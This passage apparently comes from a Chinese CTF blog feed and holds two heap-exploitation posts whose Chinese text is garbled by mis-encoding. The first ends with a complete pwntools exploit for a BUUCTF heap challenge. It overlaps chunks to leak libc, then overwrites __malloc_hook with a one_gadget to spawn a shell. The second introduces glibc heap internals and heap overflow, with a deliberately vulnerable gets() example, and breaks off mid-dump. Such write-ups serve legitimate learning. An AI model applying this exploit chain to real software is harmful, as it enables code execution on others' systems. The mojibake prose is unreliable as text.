<p>ç¬¬äºŒè¡Œå°±æ˜¯æˆ‘ä»¬éœ€è¦è¦†ç›–çš„å€¼ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬è¦åœ¨ä»–çš„å‰é¢åˆ›å»ºchunkï¼Œç„¶åå †æº¢å‡ºè¦†ç›–åˆ°ç›®æ ‡åœ°å€ã€‚ä½†æ˜¯å‰é¢çš„æ•°å€¼è¿‡äºå·¨å¤§ï¼Œfast binçš„å¤§å°ä¸è¿‡æ‰0x20~0x80è€Œå·²ï¼Œæ‰€ä»¥è¿™é‡Œè¦åˆ©ç”¨ä¸€ä¸ªå°æŠ€å·§ï¼šé”™ä½åç§»ã€‚å³æ˜¯ä¸è¦å¯¹å‡†å†…å­˜ï¼Œè€Œè¿™å†…å­˜è¿›è¡Œåç§»0xdä¸ªä½ç½®ï¼ŒæŠŠå¼€å¤´çš„7fç§»åŠ¨åˆ°æœ«ä½ï¼Œä»è€Œèƒ½ç”³è¯·åˆ°fast chunkã€‚</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418175210.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418175119.png"></p>
<p>è€Œåœ¨è¿™é‡Œç”³è¯·chunkè·Ÿä¹‹å‰å·®ä¸å¤šï¼Œå…ˆæŠŠä¹‹å‰é‡Šæ”¾çš„chunk4ç”³è¯·å›æ¥ï¼Œä½œä¸ºfast chunkï¼Œæˆ‘æ˜¯ç”³è¯·äº†0x60çš„å¤§å°ã€‚ç„¶åå†é‡Šæ”¾æ‰ï¼Œå½’åˆ°fast binå»ï¼Œç„¶åé€šè¿‡2æ¥ä¿®æ”¹å…¶fdçš„å€¼ï¼Œå»æŒ‡å‘malloc_hooké™„è¿‘çš„åœ°å€ï¼Œç„¶åç”³è¯·ä¸¤æ¬¡åŒæ ·å¤§å°çš„chunkï¼Œç¬¬äºŒä¸ªchunkå°±ä¼šåœ¨æˆ‘ä»¬æƒ³è¦çš„åœ°å€ã€‚è¿™é‡Œçš„åç§»è¾“å…¥ï¼Œå› ä¸ºå…ˆåœ¨hookçš„ä½ç½®ä¸Šç§»0x20-0xdå¤„å»ºchunkï¼Œé‚£ä¹ˆå‰0x10ç”¨æ¥æ ‡è®°ï¼Œåé¢çš„æ‰æ˜¯å­˜æ”¾æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥æ•°æ®çš„èµ·å§‹ä½ç½®è·ç¦»hookå‡½æ•°æŒ‡é’ˆçš„åç§»ä¸º0x10-0xd=0x3ï¼Œç›¸å·®3ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨p(8)*3å…ˆå¡«å……è¿™ä¸ªåå·®ï¼Œç„¶åæ‰æ˜¯çœŸæ­£çš„hookå‡½æ•°æŒ‡é’ˆåœ°å€ï¼Œå†å†™å…¥one_gadgetçš„åœ°å€å³å¯ã€‚</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25412</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendlineafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.recvline()<br>	<span class="hljs-keyword">return</span> p.recvline() <span class="hljs-comment">#æ¥æ”¶å †ä¸­å†…å®¹</span><br><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk0</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk2</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk3</span><br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#chunk4</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#åœ¨chunk4ä¸Šå ä¸Šäº†chunk2</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#chunk5ï¼Œé˜²æ­¢chunk4ä¸top chunkåˆå¹¶</span><br>free(<span class="hljs-number">4</span>)<br>leak_base=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br>libc_base=leak_base-<span class="hljs-number">0x3c4b78</span><br>malloc_hook=libc_base+<span class="hljs-number">0x3c4b10</span><br>log.info(<span class="hljs-string">&quot;leak address:0x%x&quot;</span> %leak_base)<br>log.info(<span class="hljs-string">&quot;libc base:0x%x&quot;</span> %libc_base)<br>log.info(<span class="hljs-string">&quot;__malloc_hook:0x%x&quot;</span> %malloc_hook)<br><br>allocate(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=p64(malloc_hook-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>fill(<span class="hljs-number">2</span>,payload)<br>allocate(<span class="hljs-number">0x60</span>)<br><br>allocate(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#mallocé™„è¿‘çš„chunk6</span><br>one_gadget=libc_base+<span class="hljs-number">0x4526a</span><br><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(one_gadget)<br>fill(<span class="hljs-number">6</span>,payload)<br>allocate(<span class="hljs-number">0x1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<p>ç»“è¯­ï¼šæ€»ç®—è‰°è‹¦çš„å®Œæˆäº†ç¬¬ä¸€é“çš„å †é¢˜ï¼Œå…¶ä¸­çš„è‰°éš¾å°±ä¸å†å¤šè¯´äº†ã€‚æ›´å¤šçš„è¿˜æ˜¯å–œæ‚¦å§ï¼Œä¸‡äº‹å¼€å¤´éš¾ï¼Œè·¨å…¥äº†è¿™é“åï¼Œåé¢å¯èƒ½ä¹Ÿè®¸å¤§æ¦‚ä¼šå®¹æ˜“äº›å§</p>
]]></content>
  </entry>
  <entry>
    <title>åˆæ¢å †</title>
    <url>/2021/04/10/2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86/</url>
    <content><![CDATA[<h1 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h1><h4 id="çŸ¥è¯†æ¥æºå¤„ï¼š"><a href="#çŸ¥è¯†æ¥æºå¤„ï¼š" class="headerlink" title="çŸ¥è¯†æ¥æºå¤„ï¼š"></a>çŸ¥è¯†æ¥æºå¤„ï¼š</h4><ul>
<li>CTF pwn ä¸­æœ€é€šä¿—æ˜“æ‡‚çš„å †å…¥å‘æŒ‡å—<a href="https://www.anquanke.com/post/id/163971">https://www.anquanke.com/post/id/163971</a></li>
<li>CTF Wiki<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/">https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/</a></li>
</ul>
<h3 id="linuxä¸‹çš„å †"><a href="#linuxä¸‹çš„å †" class="headerlink" title="linuxä¸‹çš„å †"></a>linuxä¸‹çš„å †</h3><p>å †ä¸åŒäºæ ˆï¼Œå †æ˜¯åŠ¨æ€åˆ†é…çš„ï¼ˆç”±æ“ä½œç³»ç»Ÿå†…æ ¸æˆ–è€…å †ç®¡ç†å™¨ï¼‰ï¼Œåªæœ‰åœ¨ç¨‹åºä¸­éœ€è¦æ—¶æ‰ä¼šåˆ†é…ã€‚æ ˆæ˜¯ç¨‹åºåŠ è½½è¿›å†…å­˜åå°±ä¼šå‡ºç°ï¼Œè€Œå †æ˜¯ç”± mallocã€allocã€realloc å‡½æ•°åˆ†é…å†…å­˜åæ‰ä¼šå‡ºç°ã€‚</p>
<p>å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå…¶ç”Ÿé•¿æ–¹å‘æ˜¯ä»<strong>ä½åœ°å€å‘é«˜åœ°å€ç”Ÿé•¿çš„</strong>ï¼Œä¸æ ˆçš„ä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿æ˜¯ä¸åŒçš„ã€‚å†…æ ¸ä¸€èˆ¬éƒ½ä¼šé¢„å…ˆåˆ†é…å¾ˆå¤§çš„ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œå› æ­¤å †å¯ä»¥ç”³è¯·åˆ°çš„å†…å­˜ç©ºé—´æ¯”æ ˆè¦å¤§å¾ˆå¤šï¼Œç„¶åè®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜ã€‚å¯¹å †æ“ä½œçš„<strong>æ˜¯ç”±å †ç®¡ç†å™¨ï¼ˆptmalloc2ï¼‰æ¥å®ç°çš„ï¼Œè€Œä¸æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸</strong>ã€‚å› ä¸ºå¦‚æœç¨‹åºæ¯æ¬¡ç”³è¯·æˆ–è€…é‡Šæ”¾å †æ—¶éƒ½éœ€è¦è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨çš„å¼€é”€å·¨å¤§ï¼Œå½“é¢‘ç¹è¿›è¡Œå †æ“ä½œæ—¶ï¼Œå°±ä¼šä¸¥é‡å½±å“ç¨‹åºçš„æ€§èƒ½</p>
<p>ç›®å‰ Linux æ ‡å‡†å‘è¡Œç‰ˆä¸­ä½¿ç”¨çš„å †åˆ†é…å™¨æ˜¯ glibc ä¸­çš„å †åˆ†é…å™¨ï¼šptmalloc2ã€‚ptmalloc2 ä¸»è¦æ˜¯é€šè¿‡ malloc/free å‡½æ•°æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜å—ã€‚åœ¨å†…å­˜åˆ†é…ä¸ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼ŒLinux æœ‰è¿™æ ·çš„ä¸€ä¸ªåŸºæœ¬å†…å­˜ç®¡ç†æ€æƒ³ï¼Œ<strong>åªæœ‰å½“çœŸæ­£è®¿é—®ä¸€ä¸ªåœ°å€çš„æ—¶å€™ï¼Œç³»ç»Ÿæ‰ä¼šå»ºç«‹è™šæ‹Ÿé¡µé¢ä¸ç‰©ç†é¡µé¢çš„æ˜ å°„å…³ç³»</strong>ã€‚ æ‰€ä»¥è™½ç„¶æ“ä½œç³»ç»Ÿå·²ç»ç»™ç¨‹åºåˆ†é…äº†å¾ˆå¤§çš„ä¸€å—å†…å­˜ï¼Œä½†æ˜¯è¿™å—å†…å­˜å…¶å®åªæ˜¯è™šæ‹Ÿå†…å­˜ã€‚åªæœ‰å½“ç”¨æˆ·ä½¿ç”¨åˆ°ç›¸åº”çš„å†…å­˜æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šçœŸæ­£åˆ†é…ç‰©ç†é¡µé¢ç»™ç”¨æˆ·ä½¿ç”¨ã€‚</p>
<h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">å‡½æ•°åŸå‹<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">brk</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *addr)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-keyword">intptr_t</span> increment)</span></span>;<br></code></pre></td></tr></table></figure>

<p>å¯¹äºå †çš„æ“ä½œï¼Œæ“ä½œç³»ç»Ÿæä¾›äº† brk å‡½æ•°ï¼Œglibc åº“æä¾›äº† sbrk å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ  brkçš„å¤§å°æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ã€‚</p>
<p>åˆå§‹æ—¶ï¼Œå †çš„èµ·å§‹åœ°å€ start_brk ä»¥åŠå †çš„å½“å‰æœ«å°¾ brk æŒ‡å‘åŒä¸€åœ°å€ã€‚æ ¹æ®æ˜¯å¦å¼€å¯ ASLRï¼Œä¸¤è€…çš„å…·ä½“ä½ç½®ä¼šæœ‰æ‰€ä¸åŒ</p>
<ul>
<li>ä¸å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œstart_brk ä»¥åŠ brk ä¼šæŒ‡å‘ data/bss æ®µçš„ç»“å°¾ã€‚</li>
<li>å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œstart_brk ä»¥åŠ brk ä¹Ÿä¼šæŒ‡å‘åŒä¸€ä½ç½®ï¼Œåªæ˜¯è¿™ä¸ªä½ç½®æ˜¯åœ¨ data/bss æ®µç»“å°¾åçš„éšæœºåç§»å¤„ã€‚</li>
</ul>
<p>brkå’Œsbrkä¼šæ”¹å˜program breakçš„ä½ç½®(åœ¨heapåçš„é‚£å—åŒºåŸŸ)ï¼Œbrké€šè¿‡ä¼ é€’çš„addræ¥é‡æ–°è®¾ç½®program breakï¼ŒæˆåŠŸåˆ™è¿”å›0ï¼Œå¦åˆ™è¿”å›-1ã€‚è€Œsbrkç”¨æ¥å¢åŠ heapï¼Œå¢åŠ çš„å¤§å°é€šè¿‡å‚æ•°incrementå†³å®šï¼Œè¿”å›å¢åŠ å¤§å°<strong>å‰</strong>çš„heapçš„program breakï¼Œå¦‚æœincrementä¸º0åˆ™è¿”å›program break</p>
<p>å¤§éƒ¨åˆ†æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯mallocå’Œfreeå‡½æ•°æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜ï¼Œè€Œbrkå’Œsbrkåˆ†é…çš„å †ç©ºé—´ç±»ä¼¼äºç¼“å†²æ± ï¼ˆè¿™ä¸ªç¼“å†²æ± çš„å¤§å°æ¯”mallocæ‰€è®¾ç½®çš„æ›´å¤§ï¼‰ï¼Œæ¯æ¬¡mallocä»ç¼“å†²æ± è·å¾—å†…å­˜ï¼Œå¦‚æœç¼“å†²æ± ä¸å¤Ÿäº†ï¼Œå†è°ƒç”¨brkæˆ–sbrkæ‰©å……ç¼“å†²æ± ï¼Œç›´åˆ°è¾¾åˆ°ç¼“å†²æ± å¤§å°çš„ä¸Šé™ï¼Œfreeåˆ™å°†åº”ç”¨ç¨‹åºä½¿ç”¨çš„å†…å­˜ç©ºé—´å½’è¿˜ç»™ç¼“å†²æ± ã€‚</p>
<p><img src="/2021/04/10/2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86/program_virtual_address_memory_space.png"></p>
<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc ä¼šä½¿ç”¨ mmap æ¥åˆ›å»ºç‹¬ç«‹çš„åŒ¿åæ˜ å°„æ®µã€‚åŒ¿åæ˜ å°„çš„ç›®çš„ä¸»è¦æ˜¯å¯ä»¥ç”³è¯·ä»¥ 0 å¡«å……çš„å†…å­˜ï¼Œå¹¶ä¸”è¿™å—å†…å­˜ä»…è¢«è°ƒç”¨è¿›ç¨‹æ‰€ä½¿ç”¨ã€‚</p>
<p>å¯ä»¥ç”¨munmapå‡½æ•°æ¸…é™¤mmapçš„åŒ¿åæ˜ å°„æ®µ</p>
<h4 id="å¤šçº¿ç¨‹æ”¯æŒ"><a href="#å¤šçº¿ç¨‹æ”¯æŒ" class="headerlink" title="å¤šçº¿ç¨‹æ”¯æŒ"></a>å¤šçº¿ç¨‹æ”¯æŒ</h4><p><strong>è®¸å¤šæ—¶å€™ç¨‹åºå¯èƒ½åªæ˜¯å‘æ“ä½œç³»ç»Ÿç”³è¯·å¾ˆå°çš„å†…å­˜ï¼Œä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠå¾ˆå¤§çš„å†…å­˜åˆ†é…ç»™ç¨‹åºã€‚è¿™æ ·çš„è¯ï¼Œå°±é¿å…äº†å¤šæ¬¡å†…æ ¸æ€ä¸ç”¨æˆ·æ€çš„åˆ‡æ¢ï¼Œæé«˜äº†ç¨‹åºçš„æ•ˆç‡ã€‚</strong>æˆ‘ä»¬ç§°è¿™ä¸€å—è¿ç»­çš„å†…å­˜åŒºåŸŸä¸º arenaã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ç§°ç”±ä¸»çº¿ç¨‹ç”³è¯·çš„å†…å­˜ä¸ºmain_arenaã€‚åç»­çš„ç”³è¯·çš„å†…å­˜ä¼šä¸€ç›´ä»è¿™ä¸ª arena ä¸­è·å–ï¼Œç›´åˆ°ç©ºé—´ä¸è¶³ã€‚å½“ arena ç©ºé—´ä¸è¶³æ—¶ï¼Œå®ƒå¯ä»¥é€šè¿‡å¢åŠ  brk çš„æ–¹å¼æ¥å¢åŠ å †çš„ç©ºé—´ã€‚ç±»ä¼¼åœ°ï¼Œarena ä¹Ÿå¯ä»¥é€šè¿‡å‡å° brk æ¥ç¼©å°è‡ªå·±çš„ç©ºé—´ã€‚</p>
<p><strong>åœ¨ä¸»çº¿ç¨‹é‡Šæ”¾å†…å­˜å</strong>ï¼Œå…¶å¯¹åº”çš„ arena å¹¶æ²¡æœ‰è¿›è¡Œå›æ”¶ï¼Œè€Œæ˜¯äº¤ç”± glibc æ¥è¿›è¡Œç®¡ç†ã€‚å½“åé¢ç¨‹åºå†æ¬¡ç”³è¯·å†…å­˜æ—¶ï¼Œåœ¨ glibc ä¸­ç®¡ç†çš„å†…å­˜å……è¶³çš„æƒ…å†µä¸‹ï¼Œglibc å°±ä¼šæ ¹æ®å †åˆ†é…çš„ç®—æ³•æ¥ç»™ç¨‹åºåˆ†é…ç›¸åº”çš„å†…å­˜ã€‚</p>
<p>æ³¨ï¼šå½“ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§äº 128KB æ—¶ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½• arena æœ‰è¶³å¤Ÿçš„ç©ºé—´æ—¶ï¼Œé‚£ä¹ˆç³»ç»Ÿå°±ä¼šæ‰§è¡Œ mmap å‡½æ•°æ¥åˆ†é…ç›¸åº”çš„å†…å­˜ç©ºé—´ã€‚è¿™ä¸è¿™ä¸ªè¯·æ±‚æ¥è‡ªäºä¸»çº¿ç¨‹è¿˜æ˜¯ä»çº¿ç¨‹æ— å…³ã€‚</p>
<h2 id="å †æº¢å‡º"><a href="#å †æº¢å‡º" class="headerlink" title="å †æº¢å‡º"></a>å †æº¢å‡º</h2><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ï¼ˆè½¬è½½è‡ªctf-wiki<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heapoverflow_basic-zh/%EF%BC%89">https://wiki.x10sec.org/pwn/linux/glibc-heap/heapoverflow_basic-zh/ï¼‰</a></p>
<p>å †æº¢å‡ºæ˜¯æŒ‡ç¨‹åºå‘æŸä¸ªå †å—ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«å¯ä½¿ç”¨çš„å­—èŠ‚æ•°ï¼ˆ<strong>ä¹‹æ‰€ä»¥æ˜¯å¯ä½¿ç”¨è€Œä¸æ˜¯ç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œæ˜¯å› ä¸ºå †ç®¡ç†å™¨ä¼šå¯¹ç”¨æˆ·æ‰€ç”³è¯·çš„å­—èŠ‚æ•°è¿›è¡Œè°ƒæ•´ï¼Œè¿™ä¹Ÿå¯¼è‡´å¯åˆ©ç”¨çš„å­—èŠ‚æ•°éƒ½ä¸å°äºç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°</strong>ï¼‰ï¼Œå› è€Œå¯¼è‡´äº†æ•°æ®æº¢å‡ºï¼Œå¹¶è¦†ç›–åˆ°<strong>ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€</strong>çš„ä¸‹ä¸€ä¸ªå †å—ã€‚</p>
<p>ä¸éš¾å‘ç°ï¼Œå †æº¢å‡ºæ¼æ´å‘ç”Ÿçš„åŸºæœ¬å‰ææ˜¯</p>
<ul>
<li>ç¨‹åºå‘å †ä¸Šå†™å…¥æ•°æ®ã€‚</li>
<li>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚</li>
</ul>
<p>å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œå †æº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿å¾—ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿å¾—æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚</p>
<p>å †æº¢å‡ºæ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºï¼ˆè¿˜æœ‰æ ˆæº¢å‡ºï¼Œ bss æ®µæº¢å‡ºç­‰ï¼‰ã€‚ä½†æ˜¯å…¶ä¸æ ˆæº¢å‡ºæ‰€ä¸åŒçš„æ˜¯ï¼Œå †ä¸Šå¹¶ä¸å­˜åœ¨è¿”å›åœ°å€ç­‰å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥æ§åˆ¶æ‰§è¡Œæµç¨‹çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬ä¸€èˆ¬æ— æ³•ç›´æ¥é€šè¿‡å †æº¢å‡ºæ¥æ§åˆ¶ EIP ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åˆ©ç”¨å †æº¢å‡ºçš„ç­–ç•¥æ˜¯</p>
<ol>
<li>è¦†ç›–ä¸å…¶<strong>ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk</strong> çš„å†…å®¹ã€‚<ul>
<li>  prev_size</li>
<li>sizeï¼Œä¸»è¦æœ‰ä¸‰ä¸ªæ¯”ç‰¹ä½ï¼Œä»¥åŠè¯¥å †å—çœŸæ­£çš„å¤§å°ã€‚<ul>
<li>  NON_MAIN_ARENA </li>
<li>  IS_MAPPED  </li>
<li>  PREV_INUSE </li>
<li>  the True chunk size</li>
</ul>
</li>
<li>  chunk contentï¼Œä»è€Œæ”¹å˜ç¨‹åºå›ºæœ‰çš„æ‰§è¡Œæµã€‚</li>
</ul>
</li>
<li> åˆ©ç”¨å †ä¸­çš„æœºåˆ¶ï¼ˆå¦‚ unlink ç­‰ ï¼‰æ¥å®ç°ä»»æ„åœ°å€å†™å…¥ï¼ˆ Write-Anything-Anywhereï¼‰æˆ–æ§åˆ¶å †å—ä¸­çš„å†…å®¹ç­‰æ•ˆæœï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµã€‚</li>
</ol>
<h2 id="åŸºæœ¬ç¤ºä¾‹"><a href="#åŸºæœ¬ç¤ºä¾‹" class="headerlink" title="åŸºæœ¬ç¤ºä¾‹"></a>åŸºæœ¬ç¤ºä¾‹</h2><p>ä¸‹é¢æˆ‘ä»¬ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªç¨‹åºçš„ä¸»è¦ç›®çš„æ˜¯è°ƒç”¨ malloc åˆ†é…ä¸€å—å †ä¸Šçš„å†…å­˜ï¼Œä¹‹åå‘è¿™ä¸ªå †å—ä¸­å†™å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²è¿‡é•¿ä¼šå¯¼è‡´æº¢å‡º chunk çš„åŒºåŸŸå¹¶è¦†ç›–åˆ°å…¶åçš„ top chunk ä¹‹ä¸­(å®é™…ä¸Š puts å†…éƒ¨ä¼šè°ƒç”¨ malloc åˆ†é…å †å†…å­˜ï¼Œè¦†ç›–åˆ°çš„å¯èƒ½å¹¶ä¸æ˜¯ top chunk)ã€‚</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span> &lt;===chunk<br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000020</span>fe<span class="hljs-number">1</span> &lt;===top chunk<br><span class="hljs-attribute">0x602030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br></code></pre></td></tr></table></figure>

<p>print â€˜Aâ€™*100<br>è¿›è¡Œå†™å…¥</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span> &lt;===chunk<br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span 